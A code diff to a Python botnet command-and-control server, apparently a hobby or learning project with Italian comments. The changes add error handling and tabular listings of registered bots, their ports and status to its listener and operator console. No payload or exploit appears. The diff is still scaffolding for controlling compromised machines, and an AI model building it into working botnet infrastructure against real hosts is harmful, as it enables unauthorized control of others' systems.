@@ -2,11 +2,7 @@ import concurrent.futures
 import socket
 from concurrent.futures import ThreadPoolExecutor
 from time import sleep
-
-
-
 class CC:
-
     #lista dei bot attivi con le relative porte
     activeBotSf = True
     activeBot = {}
@@ -25,6 +21,8 @@ class CC:
         self.activeBotSf = False
         self.activeBot[ip] = portList
         self.activeBotSf = True
+        return True
+
 
     #imposta lo stato di attività del bot
     def setBotStatus(self, ip, status):
@@ -33,6 +31,7 @@ class CC:
         self.botStatusSf = False
         self.botStatus[ip] = "waiting"
         self.botStatusSf = True
+        return True
 
     def listen(self):
         try:
@@ -41,26 +40,40 @@ class CC:
             print("Server is listening")
             while(True):
                 s.listen()
+                res = True
                 conn, addr = s.accept()
                 data = conn.recv(1024).decode()
                 data = data.split(" ")
-                self.addBot(data[0], data[1].strip('][').split(','))
-                self.setBotStatus(data[0], "waiting")
-                data = "bot registrated succesfully"
-                conn.send(data.encode())
+                res = self.addBot(data[0], data[1].strip('][').split(','))
+                res = self.setBotStatus(data[0], "waiting")
+                if res:
+                    data = "bot registrated succesfully"
+                    conn.send(data.encode())
+                else:
+                    data = "bot not registrated"
+                    conn.send(data.encode())
                 conn.close()
-        except:
-            print("Listening errors")
+        except Exception as e:
+            print("Listening errors: ",e)
             return
+        finally:
+            conn.close()
+            s.close()
 
     def command(self):
         sleep(1)
         while(True):
             comando = input("C&C@command: ")
             if comando == "stop":
-                break
+                return
             if comando == "ls":
-                print(self.activeBot)
+                print("Ip\t\tPorts")
+                for k,v in self.activeBot.items():
+                    print(f"{k}\t{v}")
+            if comando == "ls -s":
+                print("Ip\t\tPorts\t\tStatus")
+                for k,v in self.activeBot.items():
+                    print(f"{k}\t{v}\t{self.botStatus[k]}")
         return
 
 #avvia il C&C
